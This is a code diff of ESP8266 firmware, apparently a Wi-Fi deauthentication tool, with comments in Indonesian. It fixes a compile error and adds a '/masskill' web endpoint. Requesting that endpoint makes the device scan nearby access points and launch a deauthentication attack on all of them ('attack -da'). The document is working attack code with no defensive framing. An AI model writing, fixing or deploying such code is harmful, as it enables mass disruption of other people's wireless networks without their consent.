@@ -51,6 +51,9 @@ int a = 0;
 unsigned long indikator_kedip = 0;
 int indikator_nyala = NYALA;
 int delay_strobe = 100;
+
+// Deklarasi extern agar compiler menemukan variabel server
+extern ESP8266WebServer server;
         
 void setup() {
   String macc = WiFi.macAddress();
@@ -127,18 +130,17 @@ void setup() {
         Serial.end();
     }
 
-    // --- FIX HANDLER SERVER ---
+    // --- FIX MODE MASS KILL (NO ERROR scope & capture) ---
     if (settings::getWebSettings().enabled) {
         wifi::startAP();
         
-        // Menggunakan wifi::server agar 'server' terdeteksi oleh compiler
-        wifi::server.on("/masskill", []() {
+        server.on("/masskill", []() {
             attack.stop();
             scan.stop();
             accesspoints.removeAll();
-            cli.runCommand("scan aps -t 15s"); 
-            cli.runCommand("attack -da");      
-            wifi::server.send(200, "text/plain", "OK");
+            cli.runCommand("scan aps -t 15s"); //
+            cli.runCommand("attack -da");      //
+            server.send(200, "text/plain", "OK");
         });
     }
 
